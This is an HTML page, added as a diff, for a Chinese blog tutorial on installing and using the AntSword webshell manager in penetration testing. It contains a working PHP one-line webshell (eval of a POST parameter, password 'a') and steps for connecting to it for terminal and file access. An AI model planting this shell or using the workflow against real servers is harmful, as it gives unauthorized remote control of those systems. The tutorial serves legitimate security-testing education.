@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AntSword下载安装步骤 - 小夏的个人空间</title>
+    <link rel="stylesheet" href="../css/style.css">
+    <link rel="icon" type="image/jpeg" href="/img/LOGO.jpg">
+    <script src="../js/lib/highlight.min.js" defer></script>
+</head>
+
+<body>
+    <!-- 导航栏 -->
+    <nav class="navbar" id="navbar">
+        <div class="container">
+            <div class="nav-content">
+                <!-- 桌面端导航 -->
+                <div class="nav-pills desktop-nav">
+                    <a href="/" class="nav-link" data-page="home">主页</a>
+                    <a href="/blog" class="nav-link active" data-page="blog">文章</a>
+                    <a href="/guestbook" class="nav-link" data-page="guestbook">留言</a>
+                    <a href="/about" class="nav-link" data-page="about">关于</a>
+                </div>
+
+                <!-- 右上角控制区 -->
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="theme-toggle" title="切换主题">
+                        <svg class="moon-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z" />
+                        </svg>
+                        <svg class="sun-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z" />
+                        </svg>
+                    </button>
+
+                    <!-- 移动端菜单按钮 -->
+                    <button id="mobile-menu-toggle" class="mobile-menu-toggle">
+                        <svg class="hamburger-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                d="M4 6h16M4 12h16M4 18h16" />
+                        </svg>
+                        <svg class="close-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                d="M6 18L18 6M6 6l12 12" />
+                        </svg>
+                    </button>
+                </div>
+
+                <!-- 移动端菜单 -->
+                <div class="mobile-nav" id="mobile-nav">
+                    <a href="/" class="mobile-nav-link" data-page="home">主页</a>
+                    <a href="/blog" class="mobile-nav-link active" data-page="blog">文章</a>
+                    <a href="/guestbook" class="mobile-nav-link" data-page="guestbook">留言</a>
+                    <a href="/about" class="mobile-nav-link" data-page="about">关于</a>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <!-- 主内容区 -->
+    <main class="main-content">
+        <div class="container">
+            <div class="article-wrapper">
+                <!-- 左侧目录 -->
+                <aside class="article-toc" id="articleToc">
+                    <!-- 返回按钮 -->
+                    <a href="/blog" class="toc-back-btn">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                d="M19 12H5M12 19l-7-7 7-7" />
+                        </svg>
+                        <span>返回文章列表</span>
+                    </a>
+
+                    <!-- 文章标题 -->
+                    <div class="toc-article-title">
+                        AntSword下载安装步骤
+                    </div>
+
+                    <div class="toc-header">
+                        <svg class="toc-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                d="M4 6h16M4 12h16M4 18h7" />
+                        </svg>
+                        <span>文章目录</span>
+                    </div>
+                    <div class="toc-content" id="tocContent">
+                        <!-- 目录内容会动态生成 -->
+                    </div>
+                </aside>
+
+                <!-- 文章主体 -->
+                <article class="article">
+                    <!-- 文章头部信息 -->
+                    <div class="article-header">
+                        <!-- 分类和日期 -->
+                        <div class="article-meta">
+                            <span class="article-category">分类：工具</span>
+                            <span class="article-date">2026 年 3 月 23 日</span>
+                        </div>
+
+                        <h1 class="article-title">AntSword下载安装步骤</h1>
+
+                        <div class="article-tags">
+                            <span class="article-tag">AntSword</span>
+                            <span class="article-tag">WebShell</span>
+                            <span class="article-tag">渗透测试</span>
+                        </div>
+
+                        <div class="article-summary">
+                            详细介绍AntSword(中国蚁剑)的下载、安装、配置和使用方法，包括工作目录设置、连接配置、虚拟终端和文件管理等核心功能。
+                        </div>
+                    </div>
+
+                    <!-- 文章内容 -->
+                    <div class="article-content" id="articleContent">
+                        <h1 id="heading-0">AntSword下载安装步骤</h1>
+
+                        <h2 id="heading-1">下载安装</h2>
+
+                        <p><a href="https://github.com/AntSwordProject/AntSword-Loader/releases/download/4.0.3/AntSword-Loader-v4.0.3-win32-x64.zip"
+                                target="_blank" rel="noopener noreferrer">蚁剑下载地址</a></p>
+                        <p><a href="https://github.com/AntSwordProject/antSword/archive/refs/heads/master.zip"
+                                target="_blank" rel="noopener noreferrer">蚁剑工作目录</a></p>
+
+                        <p>将文件下载后解压</p>
+
+                        <figure>
+                            <img src="https://tao-pic.pages.dev/antsword/image-20260323084659620.png" alt="解压文件"
+                                title="解压文件">
+                            <figcaption>图注：解压文件</figcaption>
+                        </figure>
+
+                        <p>打开AntSword-Loader目录，打开AntSword.exe</p>
+
+                        <figure>
+                            <img src="https://tao-pic.pages.dev/antsword/image-20260323084749631.png" alt="AntSword主界面"
+                                title="AntSword主界面">
+                            <figcaption>图注：AntSword主界面</figcaption>
+                        </figure>
+
+                        <p>点击初始化</p>
+
+                        <figure>
+                            <img src="https://tao-pic.pages.dev/antsword/image-20260323084816092.png" alt="初始化"
+                                title="初始化">
+                            <figcaption>图注：初始化</figcaption>
+                        </figure>
+
+                        <p>选择工作目录为antsword-master</p>
+
+                        <figure>
+                            <img src="https://tao-pic.pages.dev/antsword/image-20260323084956099.png" alt="选择工作目录"
+                                title="选择工作目录">
+                            <figcaption>图注：选择工作目录</figcaption>
+                        </figure>
+
+                        <p>重新打开，即可使用</p>
+
+                        <figure>
+                            <img src="https://tao-pic.pages.dev/antsword/image-20260323085128194.png" alt="AntSword启动"
+                                title="AntSword启动">
+                            <figcaption>图注：AntSword启动</figcaption>
+                        </figure>
+
+                        <h2 id="heading-2">使用</h2>
+
+                        <h3 id="heading-3">php的一句话木马</h3>
+
+                        <pre><code class="language-php">&lt;?php
+@eval($_POST['a']);
+?&gt;</code></pre>
+
+                        <p>连接密码就是a</p>
+
+                        <h3 id="heading-4">连接</h3>
+
+                        <p>右键，添加数据</p>
+
+                        <figure>
+                            <img src="https://tao-pic.pages.dev/antsword/image-20260323085849171.png" alt="添加数据"
+                                title="添加数据">
+                            <figcaption>图注：添加数据</figcaption>
+                        </figure>
+
+                        <figure>
+                            <img src="https://tao-pic.pages.dev/antsword/image-20260323090120893.png" alt="连接配置"
+                                title="连接配置">
+                            <figcaption>图注：连接配置</figcaption>
+                        </figure>
+
+                        <h3 id="heading-5">操作</h3>
+
+                        <p>常用操作有虚拟终端和文件管理</p>
+
+                        <figure>
+                            <img src="https://tao-pic.pages.dev/antsword/image-20260323090351383.png" alt="操作菜单"
+                                title="操作菜单">
+                            <figcaption>图注：操作菜单</figcaption>
+                        </figure>
+
+                        <p>虚拟终端就是命令行，对应的是cmd或terminal</p>
+
+                        <figure>
+                            <img src="https://tao-pic.pages.dev/antsword/image-20260323090454305.png" alt="虚拟终端"
+                                title="虚拟终端">
+                            <figcaption>图注：虚拟终端</figcaption>
+                        </figure>
+
+                        <p>文件管理是对以图形化对文件进行操作，双击默认打开的是文件管理</p>
+
+                        <figure>
+                            <img src="https://tao-pic.pages.dev/antsword/image-20260323090829334.png" alt="文件管理"
+                                title="文件管理">
+                            <figcaption>图注：文件管理</figcaption>
+                        </figure>
+                    </div>
+                </article>
+            </div>
+        </div>
+    </main>
+
+    <!-- 页脚 -->
+    <footer class="footer">
+        <div class="container">
+            <p>&copy; 2026 小夏的个人空间</p>
+        </div>
+    </footer>
+
+    <script src="../js/main.js"></script>
+    <script src="../js/article-toc.js"></script>
+</body>
+
+</html>
